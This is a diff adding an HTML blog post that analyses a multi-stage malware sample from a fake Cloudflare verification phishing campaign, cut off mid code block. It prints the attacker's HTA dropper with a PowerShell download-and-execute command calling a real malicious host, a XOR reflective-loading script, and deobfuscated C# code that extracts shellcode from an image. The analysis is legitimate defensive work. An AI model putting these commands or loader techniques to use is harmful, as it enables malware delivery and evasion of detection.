@@ -1,0 +1,358 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta name="generator" content="Astro v7.1.1"><meta property="og:title" content="Analysing a Multi-Stage Malware From a Cloudflare Verification Phishing Campaign | k3ng.xyz"><meta property="og:description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta property="og:type" content="website"><meta property="og:image" content="http://localhost:4321/images/cloudflare_phishing/cloudflare_phishing_thumbnail.jpg"><link rel="icon" type="image/jpeg" href="/favicon.jpg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet"><title>Analysing a Multi-Stage Malware From a Cloudflare Verification Phishing Campaign | k3ng.xyz</title><script>
+      const savedTheme = localStorage.getItem('theme');
+      const preferredTheme = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+      document.documentElement.dataset.theme = savedTheme || preferredTheme;
+    </script><link rel="stylesheet" href="/_astro/BaseLayout.DZwBvaeU.css"></head><body><header class="site-header"><div class="header-inner"><a class="wordmark" href="/" aria-label="Home">k3ng</a><nav aria-label="Primary navigation"><a href="/blog" aria-current="page">Blog</a><a href="/writeups">Writeups</a><a href="/about">About</a></nav><button class="theme-toggle" type="button" aria-label="Toggle color theme"><span class="theme-light" aria-hidden="true">☼</span><span class="theme-dark" aria-hidden="true">☾</span></button></div></header><main class="article-shell has-toc"><article><header class="article-header"><p class="eyebrow">Blog</p><h1>Analysing a Multi-Stage Malware From a Cloudflare Verification Phishing Campaign</h1><time datetime="2025-11-14T00:00:00.000Z">November 14, 2025</time></header><div class="prose"><p>Welcome to my first blog post, where I will (try) to dissect a malware sample used on a Cloudflare verification phishing campaign.</p>
+<h1 id="background">Background</h1>
+<p>I encountered a post on Reddit where a user is asking whether they are encountering a “virus” from an alleged “device verification” procedure from Cloudflare. This post intrigued me since I recently did a <a target="_blank" rel="noreferrer" href="https://github.com/DownUnderCTF/Challenges_2025_Public/tree/main/misc/fishy_website">challenge for DownUnderCTF 2025</a> using a similar method of phishing, using a fake verification dialog and guiding the user to run a command using the Run window.</p>
+<p><img src="/images/cloudflare_phishing/cloudflare_phishing_1.jpg" alt=""></p>
+<h1 id="stage-1-dropper">Stage 1: Dropper</h1>
+<p>The second screenshot above will execute <code>mshta.exe</code>, a Windows-native executable to execute HTML applications. The <code>mshta.exe</code> executable will execute an HTA file that is hosted on <code>hxxp[://]206[.]0xF5[.]132[.]15/platinum[.]odd</code>.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#7EE787">head</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">  &#x3C;</span><span style="color:#7EE787">script</span><span style="color:#79C0FF"> language</span><span style="color:#E6EDF3">=</span><span style="color:#A5D6FF">"JScript"</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">    window.</span><span style="color:#D2A8FF">onload</span><span style="color:#FF7B72"> =</span><span style="color:#FF7B72"> function</span><span style="color:#E6EDF3"> () {</span></span>
+<span class="line"><span style="color:#FF7B72">      var</span><span style="color:#E6EDF3"> shell </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> new</span><span style="color:#D2A8FF"> ActiveXObject</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"WScript.Shell"</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">      var</span><span style="color:#E6EDF3"> cmd </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> 'powershell -w h -c "iex (irm http://jonathanmillersagriculture.site)"'</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">      shell.</span><span style="color:#D2A8FF">Exec</span><span style="color:#E6EDF3">(cmd);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">      window.</span><span style="color:#D2A8FF">close</span><span style="color:#E6EDF3">();</span></span>
+<span class="line"><span style="color:#E6EDF3">    };</span></span>
+<span class="line"><span style="color:#E6EDF3">  &#x3C;/</span><span style="color:#7EE787">script</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;/</span><span style="color:#7EE787">head</span><span style="color:#E6EDF3">></span></span></code></pre>
+<p>The HTA file will execute JSCript code to execute a PowerShell command. The command will download and execute a script hosted at <code>hxxp[://]jonathanmillersagriculture[.]site</code>.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">❯</span><span style="color:#A5D6FF"> curl</span><span style="color:#A5D6FF"> http://jonathanmillersagriculture.site</span><span style="color:#E6EDF3"> </span></span>
+<span class="line"><span style="color:#FF7B72">&#x3C;!</span><span style="color:#FFA657">DOCTYPE</span><span style="color:#A5D6FF"> HTML</span><span style="color:#A5D6FF"> PUBLIC</span><span style="color:#A5D6FF"> "-//IETF//DTD HTML 2.0//EN"</span><span style="color:#FF7B72">></span></span>
+<span class="line"><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">html>&#x3C;head</span><span style="color:#FF7B72">></span></span>
+<span class="line"><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">title</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">302 Found</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">/title</span><span style="color:#FF7B72">></span></span>
+<span class="line"><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">/head>&#x3C;body</span><span style="color:#FF7B72">></span></span>
+<span class="line"><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">h</span><span style="color:#FF7B72">1></span><span style="color:#E6EDF3">Found</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">/h</span><span style="color:#FF7B72">1></span></span>
+<span class="line"><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">p</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">The document has moved </span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">a href</span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF">"https://google.com"</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">here</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">/a</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">.</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">/p</span><span style="color:#FF7B72">></span></span>
+<span class="line"><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">hr</span><span style="color:#FF7B72">></span></span>
+<span class="line"><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">address</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">Apache/2.4.52 (</span><span style="color:#FFA657">Ubuntu</span><span style="color:#E6EDF3">) Server at jonathanmillersagriculture.site Port </span><span style="color:#FF7B72">80&#x3C;</span><span style="color:#E6EDF3">/address</span><span style="color:#FF7B72">></span></span>
+<span class="line"><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">/body>&#x3C;/html</span><span style="color:#FF7B72">></span></span></code></pre>
+<p>The server that is hosting the PowerShell script is checking our user agent to evade detection. The PowerShell script will be sent if the string <code>powershell</code> is present in our user agent header.</p>
+<p>The PowerShell is somewhat obfuscated, littered with useless function calls, variable assignments and loops. But the main functionality of the PowerShell script is to XOR two Base64-encoded strings and execute them using the <code>System.Reflection.Assembly</code> class in .NET.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#FF7B72">function</span><span style="color:#D2A8FF"> ExecuteMalware</span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#E6EDF3">    $xorString1 </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">Convert</span><span style="color:#E6EDF3">]::FromBase64String(</span><span style="color:#A5D6FF">"Kdw6QJkVs..."</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">    $xorString2 </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">Convert</span><span style="color:#E6EDF3">]::FromBase64String(</span><span style="color:#A5D6FF">"ZIaqQJoVs..."</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> ($i </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> 0</span><span style="color:#E6EDF3">; $i </span><span style="color:#FF7B72">-lt</span><span style="color:#E6EDF3"> $xorString2.Length; $i</span><span style="color:#FF7B72">++</span><span style="color:#E6EDF3">) {</span></span>
+<span class="line"><span style="color:#E6EDF3">        $xorString2[$i] </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $xorString2[$i] </span><span style="color:#FF7B72">-bxor</span><span style="color:#E6EDF3"> $xorString1[$i]</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    $executableBytes </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $xorString2</span></span>
+<span class="line"><span style="color:#E6EDF3">    $loadedExecutable </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.Reflection.Assembly</span><span style="color:#E6EDF3">]::Load($executableBytes)</span></span>
+<span class="line"><span style="color:#E6EDF3">    $entryPoint </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $loadedExecutable.EntryPoint</span></span>
+<span class="line"><span style="color:#E6EDF3">    $entryPoint.Invoke(</span><span style="color:#79C0FF">$null</span><span style="color:#FF7B72">,</span><span style="color:#FF7B72"> @</span><span style="color:#E6EDF3">())</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">ExecuteMalware</span></span></code></pre>
+<h1 id="stage-2-shellcode-loader">Stage 2: Shellcode loader</h1>
+<p>The executable from the previous script is a .NET executable that we can easily decompile using tools such as DNSpy. After decompilation, there are evident attempts to deobfuscate the code with random variable names and bogus functions.</p>
+<p><img src="/images/cloudflare_phishing/cloudflare_phishing_2.png" alt=""></p>
+<h2 id="constants">Constants</h2>
+<p>The executable uses functions as a means to return Base64-encoded and/or AES encrypted constants.</p>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>All code written in this section is already deobfuscated to make the execution path easier to read and follow.</p>
+</blockquote>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="cs"><code><span class="line"><span style="color:#FF7B72">internal</span><span style="color:#E6EDF3"> class \u003CModule\u003E</span></span>
+<span class="line"><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> string</span><span style="color:#D2A8FF"> AesKey</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">  {</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#A5D6FF"> "YWZlODJjM2Y3NDhkNDVkMA=="</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> string</span><span style="color:#D2A8FF"> AesIv</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">  {</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#A5D6FF"> "NjZhMzIwNTkzN2UxNGYyOA=="</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> string</span><span style="color:#D2A8FF"> EncryptedManifestName</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">  {</span></span>
+<span class="line"><span style="color:#8B949E">    // 28466f1b79d2419a848400d3651685be</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#A5D6FF"> "l93opW7xYY0nQN8Mx1sUBenWHdCUGwgKinfXxb/4lVA3EClQmf/RXaGw9Py/IBRV"</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> string</span><span style="color:#D2A8FF"> EncryptedExplorerPath</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">  {</span></span>
+<span class="line"><span style="color:#8B949E">    // C:\Windows\SysWOW64\explorer.exe</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#A5D6FF"> "LEqgXsk8Z8xfsfYMrJ1okgd5DIMHm7oFYzYfmCjmI+gkf55cxn/PppenTzUKZPSo"</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> string</span><span style="color:#D2A8FF"> ShellcodeRunnerSourceCode</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">  {</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#A5D6FF"> "VDqd7WDIs..."</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> string</span><span style="color:#D2A8FF"> EncryptedSystemDllString</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">  {</span></span>
+<span class="line"><span style="color:#8B949E">    // System.dll</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#A5D6FF"> "jjn+dG806P6wyDcpaOvUrw=="</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> string</span><span style="color:#D2A8FF"> EncryptedSystemCoreDllString</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">  {</span></span>
+<span class="line"><span style="color:#8B949E">    // System.Core.dll</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#A5D6FF"> "6vTZdSYZMXjK/OjCD9FNig=="</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> string</span><span style="color:#D2A8FF"> EncryptedClassName</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">  {</span></span>
+<span class="line"><span style="color:#8B949E">    // VerbGuns.VerbTrio</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#A5D6FF"> "AG1/WjgZi+dXcK/E8UwFy82kcSfzUecLpHkUcKFXNWY="</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> string</span><span style="color:#D2A8FF"> EncryptedMethodName</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">  {</span></span>
+<span class="line"><span style="color:#8B949E">    // InforPage</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#A5D6FF"> "k/qfUcAaEsq5Jdn8s4mVdw=="</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"><span style="color:#E6EDF3">  </span></span>
+<span class="line"><span style="color:#8B949E">  // snip...</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<p>The executable also has a dedicated class to decrypt some of the constants for ease of use.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="cs"><code><span class="line"><span style="color:#FF7B72">internal</span><span style="color:#FF7B72"> class</span><span style="color:#FFA657"> Constants</span></span>
+<span class="line"><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> string</span><span style="color:#FFA657"> aesKey</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> string</span><span style="color:#FFA657"> aesIv</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> string</span><span style="color:#FFA657"> manifestName</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> string</span><span style="color:#FFA657"> explorerExecutablePath</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">  static</span><span style="color:#D2A8FF"> Constants</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">  {</span></span>
+<span class="line"><span style="color:#E6EDF3">    Constants.aesKey </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> Encoding.UTF8.</span><span style="color:#D2A8FF">GetString</span><span style="color:#E6EDF3">(Convert.</span><span style="color:#D2A8FF">FromBase64String</span><span style="color:#E6EDF3">(\u003CModule\u003E.</span><span style="color:#D2A8FF">AesKey</span><span style="color:#E6EDF3">()));</span></span>
+<span class="line"><span style="color:#E6EDF3">    Constants.aesIv </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> Encoding.UTF8.</span><span style="color:#D2A8FF">GetString</span><span style="color:#E6EDF3">(Convert.</span><span style="color:#D2A8FF">FromBase64String</span><span style="color:#E6EDF3">(\u003CModule\u003E.</span><span style="color:#D2A8FF">AesIv</span><span style="color:#E6EDF3">()));</span></span>
+<span class="line"><span style="color:#E6EDF3">    Constants.manifestName </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> AesEncryption.</span><span style="color:#D2A8FF">DoAesDecrypt</span><span style="color:#E6EDF3">(\u003CModule\u003E.</span><span style="color:#D2A8FF">EncryptedManifestName</span><span style="color:#E6EDF3">(), Constants.aesKey, Constants.aesIv);</span></span>
+<span class="line"><span style="color:#E6EDF3">    Constants.explorerExecutablePath </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> AesEncryption.</span><span style="color:#D2A8FF">DoAesDecrypt</span><span style="color:#E6EDF3">(\u003CModule\u003E.</span><span style="color:#D2A8FF">EncryptedExplorerPath</span><span style="color:#E6EDF3">(), Constants.aesKey, Constants.aesIv);</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E">  // snip...</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<h2 id="shellcode-obfuscation-through-steganography">Shellcode obfuscation through steganography</h2>
+<p>The shellcode is hidden on an PNG file using XOR that is embedded on the executable using the manifest name <code>28466f1b79d2419a848400d3651685be</code>. The function will iterate through every RGB value on the image and XORs the red value to get the shellcode.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="cs"><code><span class="line"><span style="color:#FF7B72">private</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> byte</span><span style="color:#E6EDF3">[] </span><span style="color:#D2A8FF">ExtractShellcodeFromBitmap</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">byte</span><span style="color:#E6EDF3">[] </span><span style="color:#FFA657">stream</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#FF7B72">  using</span><span style="color:#E6EDF3"> (</span><span style="color:#FFA657">MemoryStream</span><span style="color:#FFA657"> memoryStream</span><span style="color:#FF7B72"> =</span><span style="color:#FF7B72"> new</span><span style="color:#FFA657"> MemoryStream</span><span style="color:#E6EDF3">(stream))</span></span>
+<span class="line"><span style="color:#E6EDF3">  {</span></span>
+<span class="line"><span style="color:#FF7B72">    using</span><span style="color:#E6EDF3"> (</span><span style="color:#FFA657">Bitmap</span><span style="color:#FFA657"> bitmap</span><span style="color:#FF7B72"> =</span><span style="color:#FF7B72"> new</span><span style="color:#FFA657"> Bitmap</span><span style="color:#E6EDF3">((</span><span style="color:#FFA657">Stream</span><span style="color:#E6EDF3">) memoryStream))</span></span>
+<span class="line"><span style="color:#E6EDF3">    {</span></span>
+<span class="line"><span style="color:#FF7B72">      int</span><span style="color:#FFA657"> width</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> bitmap.Width;</span></span>
+<span class="line"><span style="color:#FF7B72">      int</span><span style="color:#FFA657"> height</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> bitmap.Height;</span></span>
+<span class="line"><span style="color:#FF7B72">      int</span><span style="color:#FFA657"> length</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> width </span><span style="color:#FF7B72">*</span><span style="color:#E6EDF3"> height;</span></span>
+<span class="line"><span style="color:#FF7B72">      byte</span><span style="color:#E6EDF3">[] </span><span style="color:#FFA657">destination</span><span style="color:#FF7B72"> =</span><span style="color:#FF7B72"> new</span><span style="color:#FF7B72"> byte</span><span style="color:#E6EDF3">[width </span><span style="color:#FF7B72">*</span><span style="color:#E6EDF3"> height </span><span style="color:#FF7B72">*</span><span style="color:#79C0FF"> 4</span><span style="color:#E6EDF3">];</span></span>
+<span class="line"><span style="color:#FF7B72">      byte</span><span style="color:#E6EDF3">[] </span><span style="color:#FFA657">numArray</span><span style="color:#FF7B72"> =</span><span style="color:#FF7B72"> new</span><span style="color:#FF7B72"> byte</span><span style="color:#E6EDF3">[length];</span></span>
+<span class="line"><span style="color:#FFA657">      Rectangle</span><span style="color:#FFA657"> rect</span><span style="color:#FF7B72"> =</span><span style="color:#FF7B72"> new</span><span style="color:#FFA657"> Rectangle</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, width, height);</span></span>
+<span class="line"><span style="color:#FFA657">      BitmapData</span><span style="color:#FFA657"> bitmapdata</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> bitmap.</span><span style="color:#D2A8FF">LockBits</span><span style="color:#E6EDF3">(rect, ImageLockMode.ReadOnly, PixelFormat.Format32bppArgb);</span></span>
+<span class="line"><span style="color:#FF7B72">      try</span></span>
+<span class="line"><span style="color:#E6EDF3">      {</span></span>
+<span class="line"><span style="color:#E6EDF3">        Marshal.</span><span style="color:#D2A8FF">Copy</span><span style="color:#E6EDF3">(bitmapdata.Scan0, destination, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">, destination.Length);</span></span>
+<span class="line"><span style="color:#FF7B72">        int</span><span style="color:#FFA657"> stride</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> bitmapdata.Stride;</span></span>
+<span class="line"><span style="color:#FF7B72">        for</span><span style="color:#E6EDF3"> (</span><span style="color:#FF7B72">int</span><span style="color:#FFA657"> index1</span><span style="color:#FF7B72"> =</span><span style="color:#79C0FF"> 0</span><span style="color:#E6EDF3">; index1 </span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3"> height; </span><span style="color:#FF7B72">++</span><span style="color:#E6EDF3">index1)</span></span>
+<span class="line"><span style="color:#E6EDF3">        {</span></span>
+<span class="line"><span style="color:#FF7B72">          int</span><span style="color:#FFA657"> num1</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> index1 </span><span style="color:#FF7B72">*</span><span style="color:#E6EDF3"> stride;</span></span>
+<span class="line"><span style="color:#FF7B72">          for</span><span style="color:#E6EDF3"> (</span><span style="color:#FF7B72">int</span><span style="color:#FFA657"> index2</span><span style="color:#FF7B72"> =</span><span style="color:#79C0FF"> 0</span><span style="color:#E6EDF3">; index2 </span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3"> width; </span><span style="color:#FF7B72">++</span><span style="color:#E6EDF3">index2)</span></span>
+<span class="line"><span style="color:#E6EDF3">          {</span></span>
+<span class="line"><span style="color:#FF7B72">            int</span><span style="color:#FFA657"> num2</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> num1 </span><span style="color:#FF7B72">+</span><span style="color:#E6EDF3"> index2 </span><span style="color:#FF7B72">*</span><span style="color:#79C0FF"> 4</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">            int</span><span style="color:#FFA657"> index3</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> index1 </span><span style="color:#FF7B72">*</span><span style="color:#E6EDF3"> width </span><span style="color:#FF7B72">+</span><span style="color:#E6EDF3"> index2;</span></span>
+<span class="line"><span style="color:#FF7B72">            byte</span><span style="color:#FFA657"> num3</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> destination[num2 </span><span style="color:#FF7B72">+</span><span style="color:#79C0FF"> 2</span><span style="color:#E6EDF3">];</span></span>
+<span class="line"><span style="color:#E6EDF3">            numArray[index3] </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> (</span><span style="color:#FF7B72">byte</span><span style="color:#E6EDF3">) ((</span><span style="color:#FF7B72">int</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">byte</span><span style="color:#E6EDF3">.MaxValue </span><span style="color:#FF7B72">-</span><span style="color:#E6EDF3"> (</span><span style="color:#FF7B72">int</span><span style="color:#E6EDF3">) num3 </span><span style="color:#FF7B72">^</span><span style="color:#79C0FF"> 114</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#E6EDF3">          }</span></span>
+<span class="line"><span style="color:#E6EDF3">        }</span></span>
+<span class="line"><span style="color:#E6EDF3">      }</span></span>
+<span class="line"><span style="color:#FF7B72">      finally</span></span>
+<span class="line"><span style="color:#E6EDF3">      {</span></span>
+<span class="line"><span style="color:#E6EDF3">        bitmap.</span><span style="color:#D2A8FF">UnlockBits</span><span style="color:#E6EDF3">(bitmapdata);</span></span>
+<span class="line"><span style="color:#E6EDF3">      }</span></span>
+<span class="line"><span style="color:#FF7B72">      return</span><span style="color:#E6EDF3"> numArray;</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<h2 id="dynamic-compiling-of-the-shellcode-runner">Dynamic compiling of the shellcode runner</h2>
+<p>The previous code block mentions a <code>RunShellcodeRunner</code> method, where it will dynamically compile the source of the runner and executes them. Specifically, the method will target the <code>InforPage</code> method on the <code>VerbGuns.VerbTrio</code> class.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="cs"><code><span class="line"><span style="color:#FF7B72">public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> void</span><span style="color:#D2A8FF"> RunShellcodeRunner</span><span style="color:#E6EDF3">(</span></span>
+<span class="line"><span style="color:#FF7B72">  string</span><span style="color:#FFA657"> executablePath</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#FF7B72">  byte</span><span style="color:#E6EDF3">[] </span><span style="color:#FFA657">shellcode</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#FF7B72">  new</span><span style="color:#FFA657"> CSharpCodeProvider</span><span style="color:#E6EDF3">().</span><span style="color:#D2A8FF">CompileAssemblyFromSource</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">new</span><span style="color:#FFA657"> CompilerParameters</span><span style="color:#E6EDF3">()</span></span>
